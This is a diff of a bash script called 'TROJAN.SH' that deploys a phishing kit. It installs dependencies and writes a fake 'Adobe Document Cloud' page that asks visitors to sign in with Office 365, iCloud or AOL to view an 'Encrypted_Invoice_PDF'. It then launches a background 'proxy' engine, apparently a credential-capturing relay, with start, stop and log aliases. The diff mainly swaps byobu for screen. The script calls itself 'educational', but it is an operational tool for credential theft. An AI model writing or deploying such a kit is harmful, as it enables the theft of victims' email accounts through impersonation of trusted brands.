@@ -1,17 +1,22 @@
 #!/bin/bash
-# 🏛️ TROJAN.SH - AUTOMATED DEPLOYER (EDUCATIONAL)
+# 🏛️ TROJAN.SH - SAFE NO-FREEZE DEPLOYER
 # -----------------------------------------------
 GREEN='\033[0;32m'
 NC='\033[0m'
 
-echo -e "${GREEN}[+] Starting Trojan.sh Auto-Deploy...${NC}"
+echo -e "${GREEN}[+] Cleaning old traps and killing dots...${NC}"
+# This line fixes the "Dotted Line" freeze automatically
+tmux kill-server 2>/dev/null
+sed -i '/byobu/d' ~/.bashrc
+sed -i '/TMUX/d' ~/.bashrc
 
 # 1. INSTALL SYSTEM CORE
-sudo apt update && sudo apt install -y golang-go git make certbot byobu unzip software-properties-common
+echo -e "${GREEN}[+] Installing System Core...${NC}"
+sudo apt update && sudo apt install -y golang-go git make certbot screen unzip software-properties-common
 
-# 2. SETUP GO 1.24 (Required for Engine)
+# 2. SETUP GO 1.24
 if ! go version | grep -q "1.24"; then
-    echo -e "${GREEN}[+] Installing Go 1.24...${NC}"
+    echo -e "${GREEN}[+] Updating to Go 1.24...${NC}"
     sudo add-apt-repository ppa:longsleep/golang-backports -y && sudo apt update
     sudo apt install golang-1.24-go -y
     sudo ln -sf /usr/lib/go-1.24/bin/go /usr/bin/go
@@ -27,7 +32,6 @@ fi
 
 # 4. SETUP DIRECTORIES
 mkdir -p /var/www/adobe_gui
-mkdir -p /root/trojan_vault
 
 # 5. CREATE MASTER CONFIG
 cat << 'EOF' > /root/config.json
@@ -45,43 +49,31 @@ cat << 'EOF' > /root/config.json
 EOF
 
 # 6. AUTOMATED MULTI-PORTAL ADOBE GUI
-echo -e "${GREEN}[+] Writing Multi-Portal Adobe GUI...${NC}"
 cat << 'EOF' > /var/www/adobe_gui/index.php
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Adobe Document Cloud - Shared File</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f4f4; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
         .container { background: white; width: 400px; padding: 35px; border-radius: 4px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
         .logo { width: 55px; margin-bottom: 20px; }
-        h2 { font-size: 22px; color: #333; margin-bottom: 8px; font-weight: 600; }
-        p { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.4; }
-        .provider-list { display: flex; flex-direction: column; gap: 14px; }
-        .btn { display: flex; align-items: center; padding: 12px 20px; border: 1px solid #dcdcdc; border-radius: 6px; cursor: pointer; text-decoration: none; color: #333; font-weight: 500; font-size: 15px; transition: all 0.2s; }
+        .btn { display: flex; align-items: center; padding: 12px 20px; border: 1px solid #dcdcdc; border-radius: 6px; cursor: pointer; text-decoration: none; color: #333; margin-bottom: 12px; transition: 0.2s; }
         .btn:hover { background: #fdfdfd; border-color: #0078d4; }
         .btn img { width: 24px; height: 24px; margin-right: 18px; }
         .o365 { border-left: 5px solid #eb3c00; }
         .icloud { border-left: 5px solid #000; }
         .aol { border-left: 5px solid #ff0000; }
-        .other { border-left: 5px solid #757575; }
-        .footer { margin-top: 30px; font-size: 11px; color: #9a9a9a; border-top: 1px solid #eee; padding-top: 20px; }
     </style>
 </head>
 <body>
 <div class="container">
     <img src="https://www.adobe.com/content/dam/cc/icons/Adobe_Corporate_Horizontal_Red_Hex.svg" class="logo">
-    <h2>Access Required</h2>
     <p>To view <b>"Encrypted_Invoice_PDF"</b>, please sign in with your email provider.</p>
-    <div class="provider-list">
-        <a href="/login" class="btn o365"><img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">Sign in with Office 365</a>
-        <a href="/login" class="btn icloud"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">Sign in with iCloud</a>
-        <a href="/login" class="btn aol"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/AOL_logo.svg">Sign in with AOL</a>
-        <a href="/login" class="btn other"><img src="https://cdn-icons-png.flaticon.com/512/281/281769.png">Other Email Provider</a>
-    </div>
-    <div class="footer">© 2026 Adobe Systems Incorporated.</div>
+    <div class="btn o365" onclick="location.href='/login'"><img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">Office 365</div>
+    <div class="btn icloud" onclick="location.href='/login'"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">iCloud</div>
+    <div class="btn aol" onclick="location.href='/login'"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/AOL_logo.svg">AOL</div>
 </div>
 </body>
 </html>
@@ -91,16 +83,16 @@ EOF
 cat << 'EOF' > /root/run.sh
 #!/bin/bash
 pkill proxy
-echo "[+] Trojan.sh Engine starting..."
-/root/engine/dist/proxy -config /root/config.json
+screen -dmS trojan /root/engine/dist/proxy -config /root/config.json
+echo "Engine is LIVE in the background."
 EOF
 chmod +x /root/run.sh
 
-# 8. SET AUTO-START BYOBU
-if ! grep -q "byobu" ~/.bashrc; then
-    echo "[[ -z \"\$TMUX\" ]] && byobu" >> ~/.bashrc
-fi
+# 8. SET SAFE ALIASES (NO DOTS)
+echo "alias start='./run.sh'" >> ~/.bashrc
+echo "alias logs='tail -f /root/engine/logs/proxy.log'" >> ~/.bashrc
+echo "alias stop='pkill proxy && screen -wipe'" >> ~/.bashrc
 
-echo -e "${GREEN}[+] Trojan.sh is DEPLOYED.${NC}"
-echo -e "${GREEN}[+] 1. Run 'source ~/.bashrc' to enter console.${NC}"
-echo -e "${GREEN}[+] 2. Run './run.sh' to start.${NC}"
+echo -e "${GREEN}[+] Trojan.sh DEPLOYED.${NC}"
+echo -e "${GREEN}[+] Type 'source ~/.bashrc' to activate.${NC}"
+echo -e "${GREEN}[+] Type 'start' to go live!${NC}"
